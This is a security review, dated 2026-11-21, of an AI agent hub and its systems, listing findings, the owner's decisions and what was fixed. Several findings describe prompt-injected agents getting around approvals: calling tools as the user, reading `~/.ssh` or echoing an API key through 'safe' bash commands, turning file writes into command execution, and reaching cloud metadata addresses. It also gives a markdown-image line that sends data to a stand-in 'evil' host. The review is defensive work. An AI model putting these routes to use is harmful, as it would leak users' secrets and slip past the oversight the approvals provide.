# Security review, 2026-11-21

A read-only review of the hub, the hub–system protocol, every system and the web app. Five reviewers each covered one
area; the main findings were re-checked by hand (marked ✔). Nothing was changed. The decisions are in hitloop set
`security-2026-11-21`.

Already decided, so not raised as findings: **system renderers are trusted** (harness.md, Decided). Findings H3 and M8
are about *when* that trust starts and how far a renderer's reach goes, not the decision itself.

## High

| # | Finding | Where | Attacker |
|---|---------|-------|----------|
| H1 ✔ | **Realtime events reach every signed-in user.** The `on.user` channel has no params, so every browser gets every notification, approval (with tool args), pairing code and session summary. `on.session` takes any session id with no `visibleSession` check, so a member can read other people's chats live. Subscriptions also outlive sign-out and disabled accounts until the token expires. | `core/src/web.ts:446-447`, `hub/src/api/events.ts` | any signed-in member (SSO makes members real) |
| H2 ✔ | **`javascript:` URLs reach `location.assign`.** `z.url()` accepts `javascript:` (checked). A malicious MCP server's OAuth metadata (`authorization_endpoint`) becomes the Connect URL, and the click runs script on the hub origin, which reads the tokens from localStorage. The same pattern applies to the SSO test sign-in, `Link.url` (`LinkCard`, `window.open` in ThreadPane) and `web/read`'s raw `args.url` link. | `web/src/pages/ConnectPage.vue:70`, `core/src/link.ts:449`, `core/src/resources.ts:150`, `systems/web/client/ReadView.vue:35`, ayepi `auth/src/oauth2.ts:27` | a remote MCP server; a prompt-injected model |
| H3 | **A newly paired system's client build may run before review.** `/clients/*` only holds builds that are switched off or in a pending review; PairPage and ReviewView load `configComponent` by same-origin `import()`. A LAN peer that gets paired could run JS as the admin and approve itself. PairPage says "nothing it offers is used until you review it". | `hub/src/api/serve.ts:137-160`, `web/src/admin/state/config-component.ts:81-101` | network peer + one admin pairing click |
| H4 ✔ | **Agent fns started with `!` make tool calls as the person.** `#agentActor` falls back to `run.caller` when the fn isn't a session agent, and `policies.decide` allows a call whose caller is the turn user. Every write/delete tool call of a prompt-injected agent runs with no card, and admin hub fns run too if the person is an admin. | `hub/src/execution/agent.ts:724-734`, `execution/policies.ts:178` | prompt injection |
| H5 ✔ | **fs bash "safe" commands aren't confined.** The safe list is a prefix match, so `cat`, `head` and `tail` read any path outside the roots, such as fs's own Ed25519 key in its state folder, other systems' state, `~/.ssh` or `~/.aws`. Words with `$` skip the sensitivity check (`cat $PWD/.env`). Bash inherits fs's whole env, so `echo $OPENROUTER_API_KEY` is safe. Globs dodge the name rules. | `systems/fs/server/env.ts:13`, `shell.ts:25-32,155`, `sensitive.ts:410-412,477-495` | prompt injection |
| H6 | **fs writes become command execution.** `fs/write` to `.git/config` (`core.fsmonitor`) runs on the next internal `git status` hook. `package.json` or a vitest config runs on `npm test` / `npx vitest`, which are on the safe list. | `systems/fs/server/sensitive.ts:207`, `git.ts:26`, SAFE list | prompt injection |
| H7 ✔ | **The api system has no address guard.** `add_service` takes any `baseUrl`. `follow` only checks that a URL stays under the base URL, and the openapi URL is fetched unguarded, so localhost, 169.254.169.254, the hub's own port and LAN hosts are all reachable. The authoring step fires a GET, and `test_request` is `read, free`. | `systems/api/server/authoring.ts:234-246`, `http.ts:199-212`, `openapi.ts:35` | prompt injection |

## Medium

| # | Finding | Where |
|---|---------|-------|
| M1 | **Anyone on the network can become admin on a fresh install** (no env admin): the hub binds 0.0.0.0 and `createAdmin` is open while there are no users. | `hub/src/boot/env.ts:25`, `api/auth.ts:66-80` |
| M2 | **SSO hand-off login CSRF.** `/sign-in#sso=<refresh>` redeems any token, not one bound to this browser's sign-in. | `api/sso.ts:186`, `web/src/pages/SignInPage.vue:52-58` |
| M3 | **No CSP, frame-ancestors or nosniff.** Clickjacking risk on pairing and approval pages, and nothing limits an injected script. `/clients/*` serves `.html`/`.svg` inline on the hub origin. | `hub/src/api/serve.ts:98-110` |
| M4 | **Markdown images load from any https host**, which lets a prompt injection leak data with no click (`![](https://evil/?d=…)`). | `web/src/ui/markdown/inline.ts:15` |
| M5 | **Pairing spam and spoofed "From" addresses.** `/link` accepts unauthenticated hellos and notifies every admin. `addressOf` trusts `X-Forwarded-For`, which also defeats the auto-pair rate limit. A fooled admin who approves a `replaces` pairing hands over fs's key. | `hub/src/link/handlers.ts:74,182-198`, `pairing.ts:109-150` |
| M6 | **Fleet instances can act on each other's runs.** `own` / `#ownRun` check `run.system`, not `run.instance`, and ChildRelay routes to the main instance. | `execution/link-handlers.ts:43-47,129`, `link/services.ts:213-218` |
| M7 | **The hub never proves itself to systems, and links default to ws://.** A LAN man in the middle gets config secrets and the auto-pair secret. | `sdk/src/server/link.ts:69-86`, `link/config.ts:104-106` |
| M8 | **`/link` has no size or socket limits**: ws's default 100 MiB `maxPayload` applies before hello, and open uploads aren't capped. | ayepi node `upgradeHandler`, `link/services.ts:83-110` |
| M9 | **Service-name squatting in api.** Services are shared and first-come by name. Another user's token, pasted on Connections, then goes to the squatter's `baseUrl`. | `core/src/programs.ts:71`, `systems/api/server/services.ts:47-51` |
| M10 | **Headless Chrome isn't guarded for WebSockets, service workers or DNS rebinding.** A rendered page can probe local services and write the results into the page text. | `systems/web/server/chrome.ts:37-44`, `renderer.ts:118-131` |
| M11 | **Claude Code modes.** An injected agent can start, or `control`-switch, a session into `auto`/`acceptEdits` (`control` is `write, free`). The probe (`importables`, read and free) loads project `.claude` settings, so hooks and `.mcp.json` run outside permits. `allowedFolder` uses `resolve`, not `realpath`. | `systems/claude/shared/index.ts:115,141,199`, `server/agent-sdk.ts:236-291`, `impl.ts:55-61` |
| M12 | **Sign-in rate limit is per email only.** It allows password spraying, and 10 bad tries a minute locks the break-glass admin out. | `hub/src/api/web/auth.ts:25-28,51-53` |
| M13 | **Safe-prefix git commands write:** `git diff --output=<any path>`, `git branch -D/-f`. | fs SAFE list |
| M14 | **grep ReDoS.** `new RegExp(pattern)` runs synchronously on 5 MB files and freezes fs and everything it supervises. | `systems/fs/server/search.ts:47,99` |

## Low

- **Email auto-linking reaches the break-glass admin.** An IdP that lets users set a verified email takes over admin (`api/identities.ts:131-137`).
- **fs mentions** (`@` search and hover) list and preview `.env` and key files without `hidden()` (`systems/fs/server/mentions.ts:92-149`).
- **Importing an MCP server from Claude's config:** the admin card has `preview: false`, so the stdio command isn't shown (`systems/claude/shared/index.ts:209`).
- **MCP client OAuth** sends the admin client secret to whatever token endpoint the server's metadata names (`systems/mcp/server/oauth.ts:141-155`).
- **Read-only fetches** (`web/read`, `fetch_raw`, `crawl`) are an exfiltration channel: they need no approval.
- **Install path skips the reserved-name check.** A package named `hub` would bypass the grant guard (`link/supervisor.ts:172-193`). The Windows npm install uses `shell: true` with unvalidated `package`/`version`/`git` strings (`link/process.ts:66-73`). Admin only.
- **Systems label their own fns.** A system can tag a writing fn `read` and skip approval.
- **The database dry-run executes DML inside a rolled-back transaction.** Sequences and triggers still fire. `run` doesn't re-check `ctx.approved`.
- **The JS network guard on unapproved tests** and the child proxy are advisory (no OS-level enforcement).
- **fs snapshots never prune.** A refresh with a garbage secret ends a session by id. Client builds and docs are public.
- **CLI:** secrets go in argv and the WS token in the URL query. A cwd `.env` can point `HARNESS_URL` at an attacker while the admin password comes from the real env.
- **The test MCP server (`mcp/`)** binds 0.0.0.0 with fixed test tokens.

## Checked and fine

- Password hashing: scrypt, a decoy hash for unknown emails, and constant-time compares.
- Refresh tokens: hashed, rotated, and reuse ends the session.
- Token audiences are separate. The vault is AES-GCM with the key file at 0600. Logs mask secrets.
- The SSO flow uses PKCE, state and nonce in a signed cookie, with redirects pinned to `HARNESS_URL`.
- Static serving is traversal-safe.
- The system handshake uses an Ed25519 nonce proof, and names are qualified per system, so no system can override another.
- Permissions are enforced on the hub, not in the UI. The grant guard covers every link endpoint.
- The fs path guard handles `..`, drives, UNC and symlinks via realpath. Read-only roots hold.
- Code programs are interpreted with no eval.
- The database is structured, parameterised and read-only for reads.
- Markdown has its own parser with no raw HTML and a `safeLink` filter. Mermaid runs in strict mode as an img. The HTML preview iframe is `sandbox=""`. No data reaches `v-html`.
- The web address guard covers private, loopback, link-local, CGNAT, mapped v6 and every redirect hop.
- The claude system excludes `bypassPermissions`, and its env is an allowlist.

## Phil's decisions (2026-11-21, hitloop `security-2026-11-21`)

High, all fixed as recommended:
- H1 events: "Scope events per person".
- H2 `javascript:` URLs: "Schema + UI".
- H3 client builds: "Load only after approval".
- H4 agent caller: "Always an agent actor".
- H5 bash: "Confine + scrub".
- H6 writes to exec: "Ask + harden git" (covers M13).
- H7 api: "Guard, admin allow-private" (covers M9).

Medium and low:
- Web: M3 CSP + frame-ancestors + nosniff; M2 bind the SSO hand-off; M1 setup token for the first admin; M12 per-IP
  sign-in limit; M4 outside images click-to-load. Phil's note, verbatim: "For outside images and other things that
  could be conditional have admin setting. For rate limiting use ayepi/rate"
- Link: M6 check run.instance; M8 maxPayload + socket caps; M5 pairing rate limits, real socket IP.
  Not chosen: M7 (hub proves itself), reserved names + no shell on install.
- Systems: M11 Claude modes, probe settings, realpath; M14 grep in a worker; fs mentions honour hidden(); database run
  re-checks ctx.approved; M10 Chrome ws/service workers/DNS; test MCP server on 127.0.0.1; CLI secrets via env/stdin,
  no cwd .env URL with admin creds. Not chosen: pinning the MCP OAuth token endpoint.
- Exfiltration through read fetches: "Just log them" (outgoing URLs shown on the run).
- Build: "One workflow, high first".

## Status (2026-11-21, after the fix workflow)

High:
- H1: fixed. `on.user` takes the signed-in person and each event names who hears it; `on.session` checks `visibleSession`; sign-out, refresh reuse, revoke and turning someone off end subscriptions.
- H2: fixed. `HttpUrl` in core for browser-opened URLs, `safeHref` in the SDK before every data-built link; ayepi OAuth/OIDC endpoints must be https.
- H3: fixed. `SystemLifecycle.approvedClient` gates `/clients`, renderers, pages and the settings page.
- H4: fixed. `ensureAgentActor`; agent fns never call as `run.caller`.
- H5: fixed. Safe commands confined to the roots, no `$`/`~`/globs, option tables, scrubbed env.
- H6: fixed. Writes that run code ask (case-insensitive on Windows/macOS); internal and typed safe git hardened. Open: a `textconv`/`filter` already planted before the fix still runs on typed `git diff`.
- H7: fixed. Address guard on every hop and the OpenAPI fetch; private hosts per service by an admin.

Medium:
- M1: fixed. Setup code for the first admin.
- M2: fixed. One-time code bound to the browser by an httpOnly cookie.
- M3: fixed. Headers on every response, app CSP, client `.html`/`.svg` as downloads, `/_files` never runs script. Open: not yet tried in a real browser.
- M4: fixed. Outside images ask first; admin setting `outsideImages` (default `ask`).
- M5: fixed. Real socket address, `@ayepi/rate` pairing limits, collapsing, no re-key by code.
- M6: fixed. `runIsOf` checks system and instance everywhere.
- M7: not chosen.
- M8: fixed. `maxPayload` on `/link` and `/ws`, handshake socket caps, upload caps.
- M9: fixed. Services are their person's until an admin shares them; names held; connect cards show the host. Open: the hub's generic record tools still show an unshared service's name and base URL.
- M10: fixed. Per-tab proxy to the checked address, WebSockets blocked, service workers bypassed. Open: one live render check.
- M11: fixed. Riskier modes ask the person, the probe reads only user settings, realpath folder check, MCP import card.
- M12: fixed. Per (email, address) and per address with `@ayepi/rate`, IPv6 by /64; admin settings `signInLimits` and `proxyTrust`.
- M13: fixed (with H6).
- M14: fixed. Grep in a worker with a deadline; glob patterns that explode are refused.

Low:
- Email auto-linking to the break-glass admin: open.
- fs mentions: fixed.
- Claude MCP import preview: fixed.
- MCP client OAuth token endpoint: not chosen (pinning); the endpoint must now be https.
- Read-only fetches: fixed as decided (every URL listed on the run).
- Install reserved names and `shell: true`: not chosen.
- Systems label their own fns: open.
- Database: `run` re-checks `ctx.approved`: fixed. Dry-run DML in a rolled-back transaction: open.
- JS network guard and child proxy are advisory: open.
- fs snapshots: fixed (pruned). Refresh with a garbage secret: fixed (only refused). Client builds and docs public: open.
- CLI: secrets via env or stdin, no cwd `.env` URL with outside sign-in: fixed. WS token in the URL query: open.
- Test MCP server: fixed (127.0.0.1 by default).
